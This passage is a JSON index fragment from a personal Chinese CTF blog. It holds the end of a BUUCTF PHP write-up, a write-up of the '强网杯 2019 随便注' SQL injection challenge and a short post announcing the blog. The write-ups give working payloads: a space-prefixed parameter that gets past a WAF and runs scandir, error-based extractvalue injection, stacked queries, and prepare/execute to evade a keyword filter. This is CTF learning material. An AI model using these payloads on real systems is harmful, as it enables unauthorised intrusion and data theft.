值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置0，而十六进制值被定义为带前置 0x。 file_get_contents() 函数：把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。 PHP的字符串解析特性：PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】。假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。 scandir() 函数：返回指定目录中的文件和目录的数组。 构造：? num=var_dump(scandir(chr(47))) 发现flag文件，现在构造payload将里面内容读出来就行了 这里最好不用echo 因为空格被黑名单了 用print_r或者var_dump都行"},{"title":"buuctf 6-[强网杯 2019]随便注","date":"2023-02-06T06:41:06.000Z","url":"/post/73bb3fc4.html","tags":["sql注入","堆叠注入","报错注入"],"categories":["buuctf"],"content":"buuctf [强网杯 2019]随便注 正常操作后，发现只有两列，然后有正则匹配过滤了 return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject); 这题考了堆叠注入，原理很简单，就是通过 ; 号注入多条SQL语句。 看一下当前的数据库，这里考到了报错注入 原理： MySQL提供了一个 updatexml() 函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。 但是这题update被过滤了 extractvalue() 传参时候稍有不同，其余都是一样的，用这两个函数时，常常用到拼接函数，将要要查询的语句和第二个特殊符号拼接起来一起回显。 sql里拼接函数：concat，concat_ws ,group_concat 1&#39; and extractvalue(1,concat(0x7e,database(),0x7e)); 0x7e 是十六进制~ 当前数据库在supersqli 注意结果是按照报错的方式回显的。 -1&#39;;show tables;爆表 flag在那串数字里 表名为数字时，要用反引号包起来查询。 然后要使用存储过程预编译知识，构造能执行的语句 方法一： set @name1 &#x3D; sql 语句； prepare name2 from @name1 EXECUTE name2 注意：一个@是用户变量，两个@是系统变量 方法二： prepare name1 from 一个sql语句; EXECUTE name1； name1,name2的意思是一个名字 其实两者原理都一样 构造： strstr()函数对大小写很敏感，通过大写绕过即可。 "},{"title":"小破站破壳了","date":"2023-02-05T12:08:35.000Z","url":"/post/1c316701.html","content":"想来想去，看了其他许多大佬的文章，起初萌生了想建造一个属于自己的网站，但是建站不是一个简单的事情，只靠我现在的知识水平是完全不够的，于是就想简单简答的建造一个博客，用来分享我的一些做题过程与生活琐事。 2023.2.5，今天属于我的博客小破站建成了（开心~），虽然只是简单运用了hexo和大家都知道的next主题，傻瓜式建造最后上传至github，但是整个过程还是蛮曲折的，建造过程报了好多错误，但是还是靠着查询一点一点修改，最终一个简简单单的小博客站建好了。 在这个博客中我会用来分享一些做题刷题的过程，其实就是监督自己，不要三天打鱼两天晒网。如果你看到我的wp中有错误，我非常欢迎您能给我指出。其次分享一下自己在生活中的所见所闻所感，让之后的自己回味会觉得之前的日子过得有意义一点。 希望我能守住自己的初心 2023.2.5 Z1d10t"}]